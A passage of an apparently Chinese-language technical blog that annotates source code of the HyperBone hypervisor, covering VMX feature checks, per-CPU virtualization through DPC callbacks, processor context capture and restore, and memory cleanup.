class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; cpu_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//访问Vcpu数组成员，释放VMXON、VMCS、VMMStack和EPT.Pages数据结构内存</span></span><br><span class="line">        PVCPU Vcpu = &amp;pData-&gt;cpu_data[i];</span><br><span class="line">        <span class="keyword">if</span> (Vcpu-&gt;VMXON)</span><br><span class="line">            <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMXON );</span><br><span class="line">        <span class="keyword">if</span> (Vcpu-&gt;VMCS)</span><br><span class="line">            <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMCS );</span><br><span class="line">        <span class="keyword">if</span> (Vcpu-&gt;VMMStack)</span><br><span class="line">            <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMMStack );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; EPT_PREALLOC_PAGES; j++)</span><br><span class="line">            <span class="keyword">if</span> (Vcpu-&gt;EPT.Pages[j] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;EPT.Pages[j] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放物理内存和MSR位图内存</span></span><br><span class="line">    <span class="keyword">if</span> (pData-&gt;Memory)</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pData-&gt;Memory, HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pData-&gt;MSRBitmap)</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pData-&gt;MSRBitmap, HB_POOL_TAG );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存池内存</span></span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>( pData, HB_POOL_TAG );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="检查CPU虚拟化特性"><a href="#检查CPU虚拟化特性" class="headerlink" title="检查CPU虚拟化特性"></a>检查CPU虚拟化特性</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// CPU virtualization features</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">HvmCheckFeatures</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPU_VENDOR vendor = <span class="built_in">UtilCPUVendor</span>();</span><br><span class="line">    <span class="keyword">if</span> (vendor == CPU_Intel)</span><br><span class="line">        <span class="built_in">VmxCheckFeatures</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="检查并记录相应的CPU虚拟化特性"><a href="#检查并记录相应的CPU虚拟化特性" class="headerlink" title="检查并记录相应的CPU虚拟化特性"></a>检查并记录相应的CPU虚拟化特性</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Check various VMX features: EPT, VPID, VMFUNC, etc.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxCheckFeatures</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IA32_VMX_BASIC_MSR basic = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IA32_VMX_PROCBASED_CTLS_MSR ctl = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IA32_VMX_PROCBASED_CTLS2_MSR ctl2 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IA32_VMX_EPT_VPID_CAP_MSR vpidcap = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// True MSRs</span></span><br><span class="line">    basic.All = __readmsr( MSR_IA32_VMX_BASIC );<span class="comment">// 读取MSR_IA32_VMX_BASIC寄存器</span></span><br><span class="line">    g_Data-&gt;Features.TrueMSRs = basic.Fields.VmxCapabilityHint;<span class="comment">// 检查硬件直接提供的真实MSR</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Secondary control</span></span><br><span class="line">    ctl.All = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS );</span><br><span class="line">    g_Data-&gt;Features.SecondaryControls = ctl.Fields.ActivateSecondaryControl;<span class="comment">// 检查是否支持次级控制</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Secondary control（次级控制）是指在虚拟化环境中，</span></span><br><span class="line"><span class="comment">    用于控制虚拟机对处理器部分功能的访问和使用的一组寄存器或设置。</span></span><br><span class="line"><span class="comment">    在虚拟化技术中，虚拟机监视器（VMM）负责管理和控制虚拟机，包括对处理器的访问和配置。</span></span><br><span class="line"><span class="comment">    为了实现安全的虚拟化环境，处理器提供了一些特殊的次级控制寄存器或标志位，</span></span><br><span class="line"><span class="comment">    用于限制虚拟机的某些操作或行为，以防止虚拟机绕过VMM直接访问处理器的敏感功能或破坏虚拟化隔离。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctl.Fields.ActivateSecondaryControl)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//检查 EPT, VPID, VMFUNC</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        EPT（Extended Page Tables）：EPT是Intel VT-x虚拟化技术中的一项功能，</span></span><br><span class="line"><span class="comment">        它允许在虚拟机监控程序（VMM）和虚拟机（VM）之间进行内存管理。</span></span><br><span class="line"><span class="comment">        EPT使用了额外的页表层级，将虚拟地址转换为物理地址，并提供了更高效的内存虚拟化支持。</span></span><br><span class="line"><span class="comment">        EPT可以提高虚拟机的性能和隔离性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        VPID（Virtual Processor Identifier）：VPID是Intel VT-x虚拟化技术中的一个特性，</span></span><br><span class="line"><span class="comment">        用于改进虚拟机切换时的TLB（Translation Lookaside Buffer）缓存效率。</span></span><br><span class="line"><span class="comment">        每个虚拟机都被分配一个唯一的VPID，当虚拟机切换时，可以保留TLB中与新虚拟机关联的页表条目，</span></span><br><span class="line"><span class="comment">        加速虚拟机的上下文切换。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        VMFUNC（VM Functions）：VMFUNC是Intel VT-x虚拟化技术中的一项功能，</span></span><br><span class="line"><span class="comment">        它允许虚拟机中的代码调用一些特殊的处理器功能。</span></span><br><span class="line"><span class="comment">        通过VMFUNC，虚拟机可以执行一些特权指令，包括对虚拟化扩展的访问控制、访问虚拟机控制结构等。</span></span><br><span class="line"><span class="comment">        VMFUNC使得虚拟化软件可以更加灵活地扩展和控制虚拟机的功能。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        ctl2.All = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS2 );</span><br><span class="line">        g_Data-&gt;Features.EPT  = ctl2.Fields.EnableEPT;</span><br><span class="line">        g_Data-&gt;Features.VPID = ctl2.Fields.EnableVPID;</span><br><span class="line">        g_Data-&gt;Features.VMFUNC = ctl2.Fields.EnableVMFunctions;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ctl2.Fields.EnableEPT != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Execute only</span></span><br><span class="line">            vpidcap.All = __readmsr( MSR_IA32_VMX_EPT_VPID_CAP );</span><br><span class="line">            g_Data-&gt;Features.ExecOnlyEPT = vpidcap.Fields.ExecuteOnly;</span><br><span class="line">            g_Data-&gt;Features.InvSingleAddress = vpidcap.Fields.IndividualAddressInvVpid;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (vpidcap.Fields.ExecuteOnly == <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No execute-only EPT translation support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No EPT/VPID support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No secondary contol support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="HVM与VMX"><a href="#HVM与VMX" class="headerlink" title="HVM与VMX"></a>HVM与VMX</h1><p>VMX代表虚拟机扩展（Virtual Machine Extensions），是Intel处理器提供的硬件虚拟化技术。通过VMX，处理器可以在同一个物理主机上同时运行多个虚拟机，每个虚拟机都能拥有自己的操作系统和应用程序，并且相互之间是隔离的。</p><p>HVM代表硬件辅助虚拟化（Hardware-assisted Virtualization），是一种虚拟化技术。它利用处理器中的硬件特性来提高虚拟化的性能和效率。HVM通常与VMX结合使用，以实现更快速、更可靠的虚拟化环境。</p><p>简而言之，VMX指的是Intel处理器提供的硬件虚拟化技术，而HVM则是一种利用硬件辅助虚拟化的技术。这两者都是为了实现高效、安全的虚拟化环境而存在的。</p><h1 id="开启虚拟化"><a href="#开启虚拟化" class="headerlink" title="开启虚拟化"></a>开启虚拟化</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Virtualize each CPU</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">StartHV</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Unknown CPU</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;CPUVendor == CPU_Other)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_SUPPORTED;<span class="comment">// 不支持</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">KeGenericCallDpc</span>( HvmpHVCallbackDPC, (PVOID)__readcr3() );<span class="comment">// 读取CR3寄存器的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Some CPU failed</span></span><br><span class="line">    ULONG count = <span class="built_in">KeQueryActiveProcessorCountEx</span>( ALL_PROCESSOR_GROUPS );<span class="comment">// 查询活动处理器的数量</span></span><br><span class="line">    <span class="keyword">if</span> (count != (ULONG)g_Data-&gt;vcpus)<span class="comment">// 活动处理器的数量不等于虚拟处理器的数量</span></span><br><span class="line">    &#123;<span class="comment">// 有处理器失败，停止虚拟化并返回失败</span></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Some CPU failed to subvert\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="built_in">StopHV</span>();</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DPC回调进行虚拟化处理"><a href="#DPC回调进行虚拟化处理" class="headerlink" title="DPC回调进行虚拟化处理"></a>DPC回调进行虚拟化处理</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">HvmpHVCallbackDPC</span><span class="params">( PRKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    DPC（Deferred Procedure Call）是一种延迟执行的过程调用机制，</span></span><br><span class="line"><span class="comment">    用于在计算机系统的中断或系统事件处理过程完成后，延迟执行一些需要高优先级处理的任务或回调函数。</span></span><br><span class="line"><span class="comment">    DPC的执行是在系统抢占模式下进行的，因此可以保证其执行的稳定性和一致性。</span></span><br><span class="line"><span class="comment">    使用DPC可以实现一些延迟处理的任务，例如缓冲区刷新、资源回收、数据处理等。</span></span><br><span class="line"><span class="comment">    通过将这些任务置于DPC中执行，可以避免阻塞正常的中断处理程序或系统服务例程，提高系统的效率和响应性能。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Dpc );<span class="comment">// Dpc是一个未使用的参数</span></span><br><span class="line">    PVCPU pVCPU = &amp;g_Data-&gt;cpu_data[CPU_IDX];<span class="comment">// 获取当前处理器的虚拟处理器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if we are loading, or unloading</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ARGUMENT_PRESENT</span>( Context ))<span class="comment">// 检测Context是否被传递，通过Context参数判断是加载还是卸载</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 执行对应的初始化操作</span></span><br><span class="line">        g_Data-&gt;CPUVendor == CPU_Intel ? <span class="built_in">IntelSubvertCPU</span>( pVCPU, Context ) : <span class="built_in">AMDSubvertCPU</span>( pVCPU, Context );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 恢复虚拟处理器</span></span><br><span class="line">        g_Data-&gt;CPUVendor == CPU_Intel ? <span class="built_in">IntelRestoreCPU</span>( pVCPU ) : <span class="built_in">AMDRestoreCPU</span>( pVCPU );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待所有DPC同步，传入同步信号量</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcSynchronize</span>( SystemArgument2 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标记DPC执行完成，传入完成信号量</span></span><br><span class="line">    <span class="built_in">KeSignalCallDpcDone</span>( SystemArgument1 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化IntelCPU"><a href="#初始化IntelCPU" class="headerlink" title="初始化IntelCPU"></a>初始化IntelCPU</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HVM.c</span></span><br><span class="line"><span class="comment">// Vendor-specific calls</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">IntelSubvertCPU</span><span class="params">( IN PVCPU Vcpu, IN PVOID SystemDirectoryTableBase )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">VmxInitializeCPU</span>( Vcpu, (ULONG64)SystemDirectoryTableBase );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// VMX.c</span></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Virtualize LP 初始化逻辑处理器</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;SystemDirectoryTableBase&quot;&gt;Kernel CR3&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxInitializeCPU</span><span class="params">( IN PVCPU Vcpu, IN ULONG64 SystemDirectoryTableBase )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    存储处理器的休眠状态，其中包含所有特殊寄存器和MSR（模型特定寄存器），</span></span><br><span class="line"><span class="comment">    VMCS（虚拟机控制结构）将需要这些作为其设置的一部分。这样可以避免使用汇编序列</span></span><br><span class="line"><span class="comment">    并手动读取这些数据。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    KeSaveStateForHibernate是Windows内核函数，用于保存处理器的状态以进行休眠操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在Windows系统中，当计算机进入休眠状态时，操作系统需要保存处理器的当前状态，</span></span><br><span class="line"><span class="comment">    包括寄存器、程序计数器（指令指针）以及其他关键的执行上下文信息。</span></span><br><span class="line"><span class="comment">    这样，在计算机重新唤醒时，系统可以从先前保存的状态中恢复，并继续执行之前的操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    KeSaveStateForHibernate函数的作用就是将当前处理器的状态保存到内存中，</span></span><br><span class="line"><span class="comment">    以便后续的休眠操作使用。它会将所有的特殊寄存器、模型特定寄存器、以及一般寄存器的值保存起来，</span></span><br><span class="line"><span class="comment">    确保在休眠期间数据不会丢失。具体而言，该函数会将处理器状态保存到与休眠操作相关的数据结构中。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    这个函数通常由操作系统内核在准备进入休眠状态之前调用，以便将当前的处理器状态保存下来。</span></span><br><span class="line"><span class="comment">    然后，在计算机唤醒时，操作系统可以使用相应的函数来还原保存的状态，以实现无缝的恢复。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">KeSaveStateForHibernate</span>( &amp;Vcpu-&gt;HostState );<span class="comment">// 启动之前确保可以保存现有处理器状态，确保在虚拟化期间数据不会丢失</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    捕获整个寄存器状态。因为一旦启动虚拟机，它将从定义的客户机指令指针处开始执行，</span></span><br><span class="line"><span class="comment">    该指针会在此调用中被捕获。换句话说，我们将返回到我们的原始位置，但由于VMCS/VMX初始化代码的影响，</span></span><br><span class="line"><span class="comment">    我们的寄存器都被破坏了（因为客户机状态不包括寄存器状态）。通过在这里保存上下文，</span></span><br><span class="line"><span class="comment">    包括所有通用寄存器，我们保证返回时我们也能恢复我们的起始寄存器值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">RtlCaptureContext</span>( &amp;Vcpu-&gt;HostState.ContextFrame );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据上述情况，在这里可以判断虚拟机实际上是否已启动。</span></span><br><span class="line"><span class="comment">    我们可以通过验证VmxEnabled字段的值来检查这一点，该字段在执行VMXLAUNCH之前设置为1。</span></span><br><span class="line"><span class="comment">    在此函数中，我们不使用Data参数或任何其他局部寄存器，并且事实上VmxEnabled是不确定的，</span></span><br><span class="line"><span class="comment">    因为根据上述情况，由于VMCALL本身，我们的寄存器状态当前是脏的。</span></span><br><span class="line"><span class="comment">    通过结合全局变量和API调用使用它，我们还确保编译器不会以任何方式优化此访问，</span></span><br><span class="line"><span class="comment">    即使在LTGC/Ox构建上也是如此。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;cpu_data[CPU_IDX].VmxState == VMX_STATE_TRANSITION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        表示虚拟机已启动，因此即将将GPR（通用寄存器）还原为其原始值。</span></span><br><span class="line"><span class="comment">        这将使我们再次回到上一行代码，但是这次VmxEnabled的值将为2，绕过if和else if检查。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        g_Data-&gt;cpu_data[CPU_IDX].VmxState = VMX_STATE_ON;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        最后，恢复上下文，以便最终恢复所有寄存器和堆栈状态。通过继续以这种方式引用每个VP数据，</span></span><br><span class="line"><span class="comment">        编译器将继续生成非优化的访问，确保不会破坏先前的寄存器状态。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">VmRestoreContext</span>( &amp;g_Data-&gt;cpu_data[CPU_IDX].HostState.ContextFrame );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    尚未尝试启动虚拟机，也没有启动它。换句话说，</span></span><br><span class="line"><span class="comment">    这是第一次调用VmxInitializeCPU。因此，我们可以自由地使用所有寄存器状态。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (g_Data-&gt;cpu_data[CPU_IDX].VmxState == VMX_STATE_OFF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        首先，捕获SYSTEM进程的PML4（页目录表）的值，以便无论当前LP中断哪个进程，</span></span><br><span class="line"><span class="comment">        所有虚拟处理器都可以共享正确的内核地址空间。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        在x86-64架构下，操作系统内核和用户进程共享同一个物理地址空间。为了实现这个地址空间共享，</span></span><br><span class="line"><span class="comment">        x86-64架构定义了一个层次化的虚拟内存地址转换机制，这个机制包括页表、页目录表和页全局目录等数据结构。</span></span><br><span class="line"><span class="comment">        其中，页全局目录是整个地址空间的根节点，每个进程都有一个自己的页全局目录。</span></span><br><span class="line"><span class="comment">        页目录表用来描述一个进程的用户地址空间，</span></span><br><span class="line"><span class="comment">        而具有特殊权限的内核空间也需要一个页目录表来映射内核地址空间。</span></span><br><span class="line"><span class="comment">        &quot;捕获SYSTEM进程的PML4（页目录表）的值&quot;，</span></span><br><span class="line"><span class="comment">        实际上就是获取当前系统的内核页目录表的物理地址，以便后续的操作可以正确地访问内核的地址空间。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        由于LP调度器会将不同进程调度到不同的逻辑处理器上执行，</span></span><br><span class="line"><span class="comment">        为了保证多个逻辑处理器之间能够正确地共享内核地址空间，</span></span><br><span class="line"><span class="comment">        必须要使所有的虚拟处理器共享同一个内核页目录表。</span></span><br><span class="line"><span class="comment">        因此，在运行任意一个进程之前，需要将其对应的页目录表设置为内核页目录表的地址，即代码中所描述的部分。</span></span><br><span class="line"><span class="comment">        以保证该进程可以正确地访问内核地址空间。这可以通过在LP上下文切换时，</span></span><br><span class="line"><span class="comment">        将当前进程的页目录表设置为系统内核页目录表的物理地址来实现。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        Vcpu-&gt;SystemDirectoryTableBase = SystemDirectoryTableBase;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试在该处理器上初始化VMX</span></span><br><span class="line">        <span class="built_in">VmxSubvertCPU</span>( Vcpu );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从-CONTEXT-结构体中恢复寄存器上下文"><a href="#从-CONTEXT-结构体中恢复寄存器上下文" class="headerlink" title="从 CONTEXT 结构体中恢复寄存器上下文"></a>从 CONTEXT 结构体中恢复寄存器上下文</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">VmRestoreContext PROC</span><br><span class="line">; 与RtlCaptureContext()兼容。使用此函数代替RtlRestoreContext()函数，以便在Win10 15063+版本上不会由于RSP检查而导致蓝屏。</span><br><span class="line">push rbp</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">sub rsp, 30h</span><br><span class="line">mov 